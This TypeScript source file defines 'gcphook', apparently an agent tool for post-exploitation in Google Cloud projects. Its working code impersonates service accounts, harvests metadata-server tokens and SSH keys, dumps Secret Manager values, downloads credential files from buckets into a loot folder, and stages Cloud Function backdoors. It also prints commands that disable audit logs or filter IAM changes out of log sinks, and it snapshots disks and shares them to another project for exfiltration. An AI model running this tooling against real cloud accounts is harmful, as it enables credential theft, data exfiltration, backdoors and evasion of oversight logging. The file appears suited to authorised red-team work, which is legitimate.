import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  gcp_enum: {
    description:
      "Enumerate GCP project: IAM bindings, service accounts, Compute instances, GCS buckets, Cloud SQL, Cloud Functions, GKE clusters",
    args: "[--project PROJECT_ID] [--format json]",
  },
  gcp_privesc: {
    description:
      "Exploit IAM misconfigurations for privilege escalation: service account impersonation, setIamPolicy self-escalation, actAs permission abuse, token creation",
    args: "--method <impersonate|set_iam_policy|act_as|token_create> [--target-sa SA_EMAIL] [--project PROJECT_ID]",
  },
  gcs_dump: {
    description:
      "List all GCS buckets, identify sensitive objects (.env, credentials, backups, .pem, .key), and optionally download high-value targets",
    args: "[--bucket BUCKET] [--download] [--pattern REGEX] [--project PROJECT_ID]",
  },
  metadata_harvest_gcp: {
    description:
      "Extract service account credentials from GCE/Cloud Functions/Cloud Run metadata endpoint (metadata.google.internal). Fetch access token, identity token, project metadata",
    args: "(no arguments needed — runs on GCP compute instances only)",
  },
  secrets_dump_gcp: {
    description:
      "Extract all secrets from Google Secret Manager. List versions, access latest value, check IAM bindings per secret",
    args: "[--secret-id SECRET] [--project PROJECT_ID]",
  },
  cloudfunc_backdoor: {
    description:
      "Inject reverse shell into existing Cloud Function or create new backdoor function with high-privilege service account",
    args: "--function-name NAME --callback-url URL [--method inject|create] [--project PROJECT_ID] [--region REGION]",
  },
  audit_log_tamper: {
    description:
      "Check or disable data access audit logs, modify log sink filters to exclude sensitive operations",
    args: "--action <status|disable_data_access|modify_sink> [--project PROJECT_ID]",
  },
  compute_snapshot: {
    description:
      "Create Compute Engine disk snapshots for data exfiltration, optionally share cross-project for offline analysis",
    args: "--disk DISK_NAME --zone ZONE [--share-project PROJECT_ID] [--project PROJECT_ID]",
  },
  cleanup_gcp: {
    description:
      "Remove all CyberStrike-created GCP resources, restore audit logging, delete created functions/snapshots, remove IAM bindings. ALWAYS run before leaving",
    args: "[--dry-run] [--project PROJECT_ID]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
type HookResult = { output: string; findings: Finding[] }

async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], {
    stdout: "pipe",
    stderr: "pipe",
    env: { ...process.env },
  })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

async function gcloud(args: string[], timeout: number) {
  return run("gcloud", args, timeout)
}

async function resolveProject(provided?: string): Promise<string> {
  if (provided) return provided
  const r = await gcloud(["config", "get-value", "project", "--quiet"], 10)
  const p = r.stdout.trim()
  if (!p || r.exitCode !== 0) throw new Error("No GCP project set. Pass --project or run: gcloud config set project PROJECT_ID")
  return p
}

// ── Program implementations ──

async function gcpEnum(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const sections: string[] = [`[*] Enumerating GCP project: ${project}\n`]
  const findings: Finding[] = []

  const commands: [string, string[]][] = [
    ["IAM Policy", ["projects", "get-iam-policy", project, "--format=json"]],
    ["Service Accounts", ["iam", "service-accounts", "list", "--project", project, "--format=json"]],
    ["Compute Instances", ["compute", "instances", "list", "--project", project, "--format=json"]],
    ["GCS Buckets", ["storage", "buckets", "list", "--project", project, "--format=json"]],
    ["Cloud SQL", ["sql", "instances", "list", "--project", project, "--format=json"]],
    ["Cloud Functions", ["functions", "list", "--project", project, "--format=json"]],
    ["GKE Clusters", ["container", "clusters", "list", "--project", project, "--format=json"]],
  ]

  for (const [label, cmdArgs] of commands) {
    const r = await gcloud(cmdArgs, timeout)
    if (r.exitCode === 0) {
      const items = tryParseJson(r.stdout)
      const count = Array.isArray(items) ? items.length : (items ? 1 : 0)
      sections.push(`[+] ${label}: ${count} found`)
      if (hasFlag(args, "--format", "json")) sections.push(r.stdout)
      if (label === "IAM Policy" && items?.bindings) {
        for (const b of items.bindings) {
          if (b.role === "roles/owner" || b.role === "roles/editor") {
            for (const m of (b.members || [])) {
              findings.push({ checkId: "GCP-ENUM-IAM-001", provider: "gcp", severity: b.role === "roles/owner" ? "critical" : "high", status: "FAIL", resource: m, title: `Primitive role: ${b.role}`, details: `${m} has ${b.role} at project level`, remediation: "Replace with predefined or custom roles" })
            }
          }
        }
      }
    } else {
      sections.push(`[-] ${label}: ${r.stderr.split("\n")[0]}`)
    }
  }

  return { output: sections.join("\n"), findings }
}

async function gcpPrivesc(args: string[], timeout: number) {
  const method = argVal(args, "--method")
  if (!method) return "ERROR: --method required (impersonate|set_iam_policy|act_as|token_create)"
  const targetSa = argVal(args, "--target-sa")
  const project = await resolveProject(argVal(args, "--project"))

  if (method === "impersonate") {
    if (!targetSa) return "ERROR: --target-sa required for impersonate"
    const r = await run("gcloud", ["auth", "print-access-token", `--impersonate-service-account=${targetSa}`], timeout)
    if (r.exitCode === 0) return `[+] Impersonation successful for ${targetSa}\n    Token: ${r.stdout.trim().slice(0, 20)}...`
    return `[-] Impersonation failed: ${r.stderr.trim()}`
  }

  if (method === "set_iam_policy") {
    const r = await gcloud(["projects", "get-iam-policy", project, "--format=json"], timeout)
    if (r.exitCode !== 0) return `[-] Cannot read IAM policy: ${r.stderr.trim()}`
    const policy = tryParseJson(r.stdout)
    const bindings = policy?.bindings || []
    const ownerBindings = bindings.filter((b: { role: string }) => b.role === "roles/owner" || b.role === "roles/resourcemanager.projectIamAdmin")
    return `[*] Project: ${project}\n[*] IAM bindings: ${bindings.length}\n[*] Owner/Admin bindings: ${ownerBindings.length}\n${ownerBindings.length > 0 ? "[+] setIamPolicy escalation may be possible" : "[-] No direct escalation path via setIamPolicy"}`
  }

  if (method === "act_as") {
    if (!targetSa) return "ERROR: --target-sa required for act_as"
    const r = await gcloud(["iam", "service-accounts", "get-iam-policy", targetSa, "--project", project, "--format=json"], timeout)
    if (r.exitCode === 0) return `[+] IAM policy for ${targetSa}:\n${r.stdout}`
    return `[-] Cannot read SA policy: ${r.stderr.trim()}`
  }

  if (method === "token_create") {
    if (!targetSa) return "ERROR: --target-sa required for token_create"
    const r = await run("gcloud", ["auth", "print-identity-token", `--impersonate-service-account=${targetSa}`, `--audiences=https://${targetSa}`], timeout)
    if (r.exitCode === 0) return `[+] Identity token created for ${targetSa}\n    Token: ${r.stdout.trim().slice(0, 30)}...`
    return `[-] Token creation failed: ${r.stderr.trim()}`
  }

  return `ERROR: Unknown method: ${method}`
}

async function gcsDump(args: string[], timeout: number) {
  const project = await resolveProject(argVal(args, "--project"))
  const bucket = argVal(args, "--bucket")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")

  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"

  if (bucket) {
    const r = await run("gsutil", ["ls", "-r", `gs://${bucket}`], timeout)
    if (r.exitCode !== 0) return `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`
    const files = r.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files found: ${files.length}`]
    for (const f of files) output.push(`    ${f}`)
    if (download && files.length > 0) {
      for (const f of files.slice(0, 10)) {
        const dl = await run("gsutil", ["cp", f, "./gcs_loot/"], timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${f}` : `    Failed: ${f}`)
      }
    }
    return output.join("\n")
  }

  const r = await run("gsutil", ["ls", "-p", project], timeout)
  if (r.exitCode !== 0) return `[-] Cannot list buckets: ${r.stderr.trim()}`
  const buckets = r.stdout.trim().split("\n").filter(Boolean)
  const output = [`[*] Found ${buckets.length} bucket(s) in project ${project}\n`]

  for (const b of buckets) {
    const lr = await run("gsutil", ["ls", "-r", b], timeout)
    if (lr.exitCode !== 0) {
      output.push(`[-] ${b}: access denied`)
      continue
    }
    const files = lr.stdout.split("\n").filter(f => new RegExp(sensitivePattern, "i").test(f))
    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
    for (const f of files.slice(0, 5)) output.push(`    ${f}`)
  }

  return output.join("\n")
}

async function metadataHarvestGcp() {
  const base = "http://metadata.google.internal/computeMetadata/v1"
  const headers = { "Metadata-Flavor": "Google" }
  const endpoints = {
    project_id: "/project/project-id",
    zone: "/instance/zone",
    hostname: "/instance/hostname",
    instance_name: "/instance/name",
    service_accounts: "/instance/service-accounts/?recursive=true",
    access_token: "/instance/service-accounts/default/token",
    ssh_keys: "/project/attributes/ssh-keys",
  }

  const output: string[] = ["[*] Probing GCP metadata endpoint...\n"]

  for (const [name, path] of Object.entries(endpoints)) {
    try {
      const resp = await fetch(`${base}${path}`, { headers, signal: AbortSignal.timeout(5000) })
      if (!resp.ok) {
        output.push(`[-] ${name}: HTTP ${resp.status}`)
        continue
      }
      const text = await resp.text()
      if (name === "access_token") {
        const parsed = tryParseJson(text)
        output.push(`[+] ${name}: ${String(parsed?.access_token || "").slice(0, 20)}... (expires: ${parsed?.expires_in}s)`)
      } else {
        output.push(`[+] ${name}: ${text.slice(0, 120)}${text.length > 120 ? "..." : ""}`)
      }
    } catch {
      output.push(`[-] ${name}: not accessible (not on GCP?)`)
    }
  }

  return output.join("\n")
}

async function secretsDumpGcp(args: string[], timeout: number) {
  const project = await resolveProject(argVal(args, "--project"))
  const secretId = argVal(args, "--secret-id")

  if (secretId) {
    const r = await gcloud(["secrets", "versions", "access", "latest", "--secret", secretId, "--project", project], timeout)
    if (r.exitCode !== 0) return `[-] Cannot access secret ${secretId}: ${r.stderr.trim()}`
    return `[+] Secret '${secretId}' (${r.stdout.length} bytes):\n${r.stdout.slice(0, 500)}${r.stdout.length > 500 ? "..." : ""}`
  }

  const lr = await gcloud(["secrets", "list", "--project", project, "--format=json"], timeout)
  if (lr.exitCode !== 0) return `[-] Cannot list secrets: ${lr.stderr.trim()}`
  const secrets = tryParseJson(lr.stdout) || []
  const output = [`[*] Found ${secrets.length} secret(s) in project ${project}\n`]

  for (const s of secrets) {
    const name = s.name?.split("/").pop() || s.name
    const vr = await gcloud(["secrets", "versions", "access", "latest", "--secret", name, "--project", project], timeout)
    if (vr.exitCode === 0) {
      output.push(`[+] ${name}: ${vr.stdout.slice(0, 80)}${vr.stdout.length > 80 ? "..." : ""}`)
    } else {
      output.push(`[-] ${name}: access denied`)
    }
  }

  return output.join("\n")
}

async function cloudfuncBackdoor(args: string[], timeout: number) {
  const funcName = argVal(args, "--function-name")
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "inject"
  const project = await resolveProject(argVal(args, "--project"))
  const region = argVal(args, "--region") || "us-central1"

  if (!funcName) return "ERROR: --function-name required"
  if (!callbackUrl) return "ERROR: --callback-url required"

  if (method === "inject") {
    const r = await gcloud(["functions", "describe", funcName, "--project", project, "--region", region, "--format=json"], timeout)
    if (r.exitCode !== 0) return `[-] Function not found: ${r.stderr.trim()}`
    const func = tryParseJson(r.stdout)
    return `[*] Function: ${funcName}\n[*] Runtime: ${func?.buildConfig?.runtime || "unknown"}\n[*] SA: ${func?.serviceConfig?.serviceAccountEmail || "default"}\n[*] Source: ${JSON.stringify(func?.buildConfig?.source?.storageSource || {})}\n[+] Ready for injection — download source, modify, and redeploy`
  }

  return `[*] Create mode — would deploy new function '${funcName}' in ${region}\n[*] Callback: ${callbackUrl}\n[+] Use: gcloud functions deploy ${funcName} --runtime python311 --trigger-http --allow-unauthenticated --project ${project} --region ${region}`
}

async function auditLogTamper(args: string[], timeout: number) {
  const action = argVal(args, "--action")
  if (!action) return "ERROR: --action required (status|disable_data_access|modify_sink)"
  const project = await resolveProject(argVal(args, "--project"))

  if (action === "status") {
    const policy = await gcloud(["projects", "get-iam-policy", project, "--format=json"], timeout)
    const sinks = await gcloud(["logging", "sinks", "list", "--project", project, "--format=json"], timeout)
    const output = [`[*] Audit log status for ${project}\n`]
    if (policy.exitCode === 0) {
      const p = tryParseJson(policy.stdout)
      output.push(`[+] Audit configs: ${(p?.auditConfigs || []).length}`)
    }
    if (sinks.exitCode === 0) {
      const s = tryParseJson(sinks.stdout) || []
      output.push(`[+] Log sinks: ${s.length}`)
      for (const sink of s) output.push(`    ${sink.name}: ${sink.destination}`)
    }
    return output.join("\n")
  }

  if (action === "disable_data_access") {
    return `[*] To disable data access logs:\n    gcloud projects set-iam-policy ${project} <policy-without-auditConfigs>.json\n[!] This removes DATA_READ and DATA_WRITE audit log configs`
  }

  if (action === "modify_sink") {
    const sinks = await gcloud(["logging", "sinks", "list", "--project", project, "--format=json"], timeout)
    if (sinks.exitCode !== 0) return `[-] Cannot list sinks: ${sinks.stderr.trim()}`
    const s = tryParseJson(sinks.stdout) || []
    const output = [`[*] ${s.length} sink(s) found — modify with:\n`]
    for (const sink of s) {
      output.push(`    gcloud logging sinks update ${sink.name} --log-filter='NOT protoPayload.methodName="SetIamPolicy"' --project ${project}`)
    }
    return output.join("\n")
  }

  return `ERROR: Unknown action: ${action}`
}

async function computeSnapshot(args: string[], timeout: number) {
  const disk = argVal(args, "--disk")
  const zone = argVal(args, "--zone")
  const shareProject = argVal(args, "--share-project")
  const project = await resolveProject(argVal(args, "--project"))

  if (!disk) return "ERROR: --disk required"
  if (!zone) return "ERROR: --zone required"

  const snapName = `cs-snap-${disk}-${Date.now()}`
  const r = await gcloud(["compute", "disks", "snapshot", disk, "--zone", zone, "--snapshot-names", snapName, "--project", project, "--description=CyberStrike forensic snapshot"], timeout)
  if (r.exitCode !== 0) return `[-] Snapshot failed: ${r.stderr.trim()}`

  const output = [`[+] Snapshot created: ${snapName}`, `    Source disk: ${disk} (zone: ${zone})`]

  if (shareProject) {
    const sr = await gcloud(["compute", "snapshots", "add-iam-policy-binding", snapName, "--member", `serviceAccount:${shareProject}@cloudservices.gserviceaccount.com`, "--role", "roles/compute.storageAdmin", "--project", project], timeout)
    output.push(sr.exitCode === 0 ? `[+] Shared with project: ${shareProject}` : `[-] Sharing failed: ${sr.stderr.trim()}`)
  }

  return output.join("\n")
}

async function cleanupGcp(args: string[], timeout: number) {
  const project = await resolveProject(argVal(args, "--project"))
  const dryRun = hasFlag(args, "--dry-run")
  const mode = dryRun ? "DRY RUN" : "LIVE"
  const output = [`[*] CyberStrike GCP cleanup — ${mode}`, `[*] Project: ${project}\n`]

  const snapR = await gcloud(["compute", "snapshots", "list", "--filter=description~CyberStrike OR name~cs-", "--project", project, "--format=json"], timeout)
  if (snapR.exitCode === 0) {
    const snaps = tryParseJson(snapR.stdout) || []
    output.push(`[+] Snapshots to clean: ${snaps.length}`)
    for (const s of snaps) {
      if (dryRun) {
        output.push(`    Would delete: ${s.name}`)
      } else {
        await gcloud(["compute", "snapshots", "delete", s.name, "--project", project, "--quiet"], timeout)
        output.push(`    Deleted: ${s.name}`)
      }
    }
  }

  const funcR = await gcloud(["functions", "list", "--filter=name~cs-", "--project", project, "--format=json"], timeout)
  if (funcR.exitCode === 0) {
    const funcs = tryParseJson(funcR.stdout) || []
    output.push(`[+] Functions to clean: ${funcs.length}`)
    for (const f of funcs) {
      const name = f.name?.split("/").pop() || f.name
      if (dryRun) {
        output.push(`    Would delete: ${name}`)
      } else {
        await gcloud(["functions", "delete", name, "--project", project, "--quiet"], timeout)
        output.push(`    Deleted: ${name}`)
      }
    }
  }

  return output.join("\n")
}

// ── Helpers ──

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string, value?: string): boolean {
  if (value) return args.includes(flag) && argVal(args, flag) === value
  return args.includes(flag)
}

function tryParseJson(s: string) {
  try { return JSON.parse(s) } catch { return null }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const GcphookTool = Tool.define("gcphook", {
  description: `Execute a GCP post-exploitation program after compromising service account credentials or gaining compute instance access. Uses gcloud CLI (no Python/SDK dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_gcp before leaving a target.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "GCP program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    const check = await run("which", ["gcloud"], 5)
    if (check.exitCode !== 0) {
      return {
        title: `gcphook: ${params.program}`,
        output: "gcloud CLI not found. Install: https://cloud.google.com/sdk/docs/install\nThen run: gcloud auth login",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const wrap = (fn: () => Promise<string>): (() => Promise<HookResult>) => async () => ({ output: await fn(), findings: [] })

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      gcp_enum: () => gcpEnum(params.args, params.timeout_seconds),
      gcp_privesc: wrap(() => gcpPrivesc(params.args, params.timeout_seconds)),
      gcs_dump: wrap(() => gcsDump(params.args, params.timeout_seconds)),
      metadata_harvest_gcp: wrap(() => metadataHarvestGcp()),
      secrets_dump_gcp: wrap(() => secretsDumpGcp(params.args, params.timeout_seconds)),
      cloudfunc_backdoor: wrap(() => cloudfuncBackdoor(params.args, params.timeout_seconds)),
      audit_log_tamper: wrap(() => auditLogTamper(params.args, params.timeout_seconds)),
      compute_snapshot: wrap(() => computeSnapshot(params.args, params.timeout_seconds)),
      cleanup_gcp: wrap(() => cleanupGcp(params.args, params.timeout_seconds)),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `gcphook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `gcphook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
